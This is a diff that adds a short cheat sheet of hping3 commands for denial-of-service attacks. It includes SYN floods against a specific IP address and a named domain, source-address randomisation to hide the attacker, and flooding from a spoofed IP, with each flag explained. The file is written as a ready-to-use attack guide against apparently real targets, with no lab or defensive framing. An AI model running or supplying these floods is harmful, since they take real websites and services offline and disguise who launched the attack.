@@ -1,0 +1,31 @@
+Commands for DOS Attack using hping3
+
+INSTALLATION
+sudo apt install hping3 -y
+
+
+SIMPLE DOS ATTACK
+sudo hping3 -S --flood -V -p 80 <170.155.9.185>
+explanation : 
+    * sudo: gives needed privileges to run hping3.
+    * hping3: calls hping3 program.
+    * -S: specifies SYN packets.
+    * —flood: replies will be ignored and packets will be sent as fast as possible.
+    * -V: Verbosity.
+    * -p 80: port 80, you can replace this number for the service you want to attack.
+    * 170.155.9.185: target IP.
+
+
+Flood Using SYN Packets Against Port 80
+sudo hping3 lacampora.org -q -n -d 120 -S -p 80 --flood --rand-source
+Explanation : 
+    * lacampora.org: is the target, this time defined with a domain name.
+    * -q: brief output
+    * -n: shows target IP instead of host.
+    * -d 120: sets packet size
+    * –rand-source: hides IP address.
+
+
+Flood From a Fake IP Address With hping3
+sudo hping3 -a <FAKE IP> <target> -S -q -p 80
+
